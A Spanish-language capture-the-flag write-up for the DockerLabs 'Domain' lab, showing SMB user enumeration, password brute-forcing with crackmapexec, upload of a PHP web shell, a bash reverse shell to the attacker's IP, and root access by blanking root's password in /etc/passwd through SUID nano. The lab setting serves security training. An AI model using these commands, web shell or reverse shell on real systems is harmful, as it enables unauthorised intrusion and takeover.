# Máquina Domain

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

-----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información sobre los servicios.

```shell
nmap -sCV -p80,139,445 172.17.0.2 -oN targeted
________________________________________________
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-time: 
|   date: 2024-04-18T20:32:47
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```


## Explotación

Inspeccionamos la web:

![Pasted image 20240424213115](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/48db17cc-d22e-4b6b-8403-2cb281ec71bf)

Utilizamos **smbmap** para tratar de ver algo de información sobre el servicio **samba** pero no tenemos permisos para acceder a ningún sitio:

```shell
smbmap -H 172.17.0.2 -P 139
--------------------------------------------------
[+] IP: 172.17.0.2:139	Name: hidden.lab                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	html                                              	NO ACCESS	HTML Share
	IPC$                                              	NO ACCESS	IPC Service 
```

No tenemos ninguna información disponible. 
Utilizando la herramienta **rpcclient**:

```shell
rpcclient -U '' -N 172.17.0.2
querydispinfo and enumdomusers
------------------------------------------
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james	Name: james	Desc: 
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob	Name: bob	Desc: 
```

Encontramos un usuario **james** y un usuario **bob**.
Probamos a hacer fuerza bruta contra el servicio **samba**, con la herramienta **hydra**

```shell
 hydra -l bob -P /usr/share/wordlists/rockyou.txt smb://172.17.0.2
 --------------------------------------------------------------------
 [ERROR] target smb://172.17.0.2:445/ does not support SMBv1
```

Me da error así, he recurrido a **metasploit** con el módulo de **scanner** para el servicio **smb** pero también me daba error. Finalmente he usado **CrackMapExec**.
Al usar el **rockyou.txt** me daba error por caracteres especiales que contiene, así que he cogido las 10.000 primeras contraseñas y las he metido en un nuevo diccionario -> **top10krockyou.txt** que es el que he empleado para la fuerza bruta:

```shell
crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/top10krockyou.txt
-----------------------------------------------------------------------------------
SMB         172.17.0.2      445    86B2D8C57A0E     [+] 86B2D8C57A0E\bob:star 
```

Tras esperar un poco encontramos las credenciales del usuario **bob** -> **bob:star**

Revisamos que permisos tenemos con el usuario que hemos descubierto **bob**

```shell
smbmap -H 172.17.0.2 -u "bob" -p "star"
----------------------------------------------------------------------------------
[+] IP: 172.17.0.2:445	Name: unknown                                           
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	html                                              	READ, WRITE	HTML Share
	IPC$                                              	NO ACCESS	IPC Service (86b2d8c57a0e server (Samba, Ubuntu))
```

Vemos que tenemos permiso de **escritura** sobre el disco compartido **html**, si le echamos un vistazo, encontramos dentro el **index.html** de la web. Suponemos que la web lo está tomando de ahí, de forma que si subimos algo a este recurso compartido, es probable que se represente en la web. Así que subiremos una reverse shell:

Creamos el **cmd.php**:

```php
<?php
	system($_GET['cmd']);
?>
```

```shell
smbclient //172.17.0.2/html -U bob
put cmd.php
------------------------------------------
putting file cmd.php as \cmd.php (15,6 kb/s) (average 15,6 kb/s)
```

Nos dirigimos a la web a ver si estábamos en lo correcto:

![Pasted image 20240425105559](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/eb7db9e8-4967-40f4-bd36-e3e61355bc7c)

Hemos logrado la ejecución remota de comandos, **RCE**.

Nos enviamos una **reverse shell** y nos ponemos en escucha con **netcat**

```shell
sudo nc -nlvp 443
```

Y en la URL:

```
http://172.17.0.2/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261" 
```

Estamos dentro !

------------------------------
### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

----------------------
## Escalada de privilegios

Si miramos el **/etc/passwd**:

```shell
cat /etc/passwd
-------------------------------
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
james:x:1001:1001:james,,,:/home/james:/bin/bash
```

Vemos un par de usuarios con consola que son los mismos que encontramos con **rpcclient**.

Migramos a **bob** con su contraseña **star**:

```shell
su bob
```

Filtramos por archivos con permisos **SUID** de los que podamos abusar.

```shell
find / -perm -4000 2>/dev/null
-----------------------------------
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/nano
```

Nos encontramos con **nano**, del que ya hemos abusado otras veces. Si no sabemos cómo, siempre podemos recurrir a [GTFOBins](https://gtfobins.github.io/)

He probado a salir del contexto de nano como root pero no lo he conseguido. Probamos a quitar la "**x**" que corresponde a la contraseña del usuario **root** y si la quitamos es posible que nos deje acceder sin contraseña.

```
root:x:0:0:root:/root:/bin/bash
```

Suprimimos la "**x**":

```
root::0:0:root:/root:/bin/bash
```

```shell
su root
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo !
